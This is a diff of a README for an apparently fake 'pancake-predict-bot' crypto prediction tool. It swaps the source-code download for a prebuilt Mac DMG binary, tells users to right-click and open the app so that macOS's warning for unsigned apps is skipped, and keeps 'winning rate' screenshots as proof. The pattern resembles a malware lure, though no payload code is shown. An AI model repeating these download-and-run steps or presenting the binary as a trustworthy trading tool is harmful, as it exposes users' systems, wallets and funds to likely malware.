@@ -42,7 +42,6 @@ With these updates, our goal is to provide a safer, more flexible, and user-cent
 ###  Evidences dated 12 JUNE 2024
 
 ![Winning rate](/images/3.png?raw=true)
-![Winning rate](/images/1.png?raw=true)
 ![Winning rate](/images/2.png?raw=true)
 
 ## 🐰⚡ Installation
@@ -79,7 +78,7 @@ cd pancake-predict-bot-UI-Supported
 
 ## Way 1
 
-- Download [This Repo](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/archive/refs/heads/main.zip) the repository release and extract files. 
+- Download [DMG image](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/releases/download/v9.2/PCS_Mac.dmg) the latest version. 
 - Double-Click on the "PCS.dmg" -> Right-click on the "PCS.app" and click open to run it.
 
 ## Way 2
